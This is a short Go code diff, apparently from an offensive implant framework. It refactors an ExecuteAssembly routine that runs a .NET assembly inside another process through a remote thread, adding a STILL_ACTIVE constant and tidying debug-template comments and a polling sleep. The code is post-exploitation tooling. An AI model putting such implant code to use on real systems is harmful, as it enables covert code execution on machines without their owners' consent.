@@ -23,10 +23,8 @@ import (
 	"debug/pe"
 	"fmt"
 	"io"
-	"io/ioutil"
-	// {{if .Debug}}
-	"log"
-	// {{else}}{{end}}
+	"io/ioutil" // {{if .Debug}}
+	"log"       // {{else}}{{end}}
 	"os"
 	"os/exec"
 	"runtime"
@@ -42,6 +40,7 @@ const (
 	BobLoaderOffset     = 0x00000af0
 	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	MAX_ASSEMBLY_LENGTH = 1025024
+	STILL_ACTIVE        = 259
 )
 
 var (
@@ -424,7 +423,6 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	// {{if .Debug}}
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
-	// time.Sleep(time.Duration(rand.Int31n(timeout)) * time.Second)
 	for {
 		code, err := getExitCodeThread(threadHandle)
 		// log.Println(code)
@@ -434,8 +432,8 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 			// {{end}}
 			return "", err
 		}
-		if code == 259 {
-			time.Sleep(1000 * time.Millisecond)
+		if code == STILL_ACTIVE {
+			time.Sleep(time.Second)
 		} else {
 			break
 		}
